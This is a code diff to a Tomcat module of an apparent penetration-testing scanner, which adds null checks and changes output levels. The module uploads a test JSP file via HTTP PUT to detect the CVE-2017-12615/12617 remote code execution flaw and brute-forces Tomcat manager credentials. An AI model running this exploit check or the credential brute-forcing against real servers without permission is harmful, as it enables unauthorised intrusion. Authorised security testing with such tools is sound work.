@@ -35,7 +35,7 @@ class Module:
     name = 'Tomcat'
     description = 'Discover and exploit tomcat (default password, CVE-2017-12615, TODO: CVE-2020-1938, CVE-2020-9484)'
 
-    def run(self, target, args, useragent, proxy, timeout):
+    def run(self, target, args, useragent, proxy, timeout, safe):
         http = HTTP(target['method'], target['hostname'], target['port'], useragent, proxy, timeout)
 
         tomcat_urls = ['manager/html', 'admin/html']
@@ -45,11 +45,11 @@ class Module:
         payload='<%% out.println("%s");%%>' % random_str
         data = http.put(os.path.join(target['path'], "%s.jsp" % random_str) + "/", data=payload)
 
-        if data['code'] in [201]:
+        if data and data['code'] in [201]:
             data = http.get(os.path.join(target['path'], "%s.jsp" % random_str))
 
             if random_str in data['html'] and not payload in data['html']:
-                Output.write({'target': http.url(target['path']), 'message': 'Vulnerable to Apache Tomcat RCE (CVE-2017-12617)'})
+                Output.vuln({'target': http.url(target['path']), 'message': 'Vulnerable to Apache Tomcat RCE (CVE-2017-12617)'})
 
                 vuln_info = {
                     'hostname': target['hostname'],
@@ -64,7 +64,7 @@ class Module:
         for url in tomcat_urls:
             output = http.get(os.path.join(target['path'], url))
 
-            if not output['code'] in [401] or not 'tomcat' in output['title'].lower():
+            if not output or not output['code'] in [401] or not 'tomcat' in output['title'].lower():
                 continue
 
             http_info = {
@@ -92,14 +92,14 @@ class Module:
                 auth_type = output['auth_type']
 
                 if args['bruteforce']:
-                    Output.write({'target': http.url(os.path.join(target['path'], url)), 'message': 'Starting bruteforce...'})
+                    Output.highlight({'target': http.url(os.path.join(target['path'], url)), 'message': 'Starting bruteforce...'})
                     for cred in gen_bruteforce_creds(args['bruteforce'], creds):
                         username, password = cred.split(':')
 
                         output = http.get(os.path.join(target['path'], url), auth=(auth_type, username, password))
 
                         if output['code'] in [200]:
-                            Output.write({'target': http.url(os.path.join(target['path'], url)), 'message': 'Authentication success with login %s and password %s' % (username, password)})
+                            Output.success({'target': http.url(os.path.join(target['path'], url)), 'message': 'Authentication success with login %s and password %s' % (username, password)})
 
                             cred_info = {
                                 'hostname': target['hostname'],
